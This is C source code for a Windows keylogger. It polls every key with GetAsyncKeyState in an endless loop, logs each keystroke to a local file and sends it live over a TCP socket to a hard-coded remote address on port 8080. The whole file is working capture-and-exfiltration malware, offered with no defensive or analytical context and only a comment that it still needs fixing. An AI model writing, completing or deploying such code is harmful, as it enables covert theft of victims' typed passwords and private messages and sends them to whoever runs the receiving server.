#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>

// this file still needs fixing

void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);

int main() {
    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "172.20.10.2";

    startWinsock(&wsaData);
    client_socket = startSocket();

    startLogging(&serv_addr, client_socket, server_ip);
    return 0;
}

void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
    FILE *keysPtr;
    keysPtr = fopen("keys.txt", "w");
    keysPtr = fopen("keys.txt", "a");
    connectToServer(serv_addr, client_socket, server_ip);

    // closeSocket(client_socket);
    char c;
    while (1) {
        for (c = 0; c < 255; c++) {
            short pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed) {
                const char *text;

                if (c == VK_BACK) {
                    text = "[backspace]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_RETURN) {
                    text = "[enter]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_SHIFT) {
                    text = "[shift]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_CONTROL) {
                    text = "[ctrl]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_CAPITAL) {
                    text = "[caps]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_TAB) {
                    text = "[tab]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else if (c == VK_MENU) {
                    text = "[alt]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_socket, text);
                } else {
                    if (c >= 0x20 && c <= 0x6F){
                        char str[2];
                        str[0] = c;
                        str[1] = '\0';
                        text = str;
                        fprintf(keysPtr, "%s", text);
                        sendMsg(client_socket, text);
                    }
                }
            }
        }
    }
}

void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

SOCKET startSocket() {
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return client_socket;
}

void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {

    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", client_socket);
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else{
        printf("Client connected to server.\n");
    }
}

void sendMsg(SOCKET client_socket, const char *msg) {
    int sent = send(client_socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

void closeSocket(SOCKET client_socket) {
    closesocket(client_socket);
    WSACleanup();
}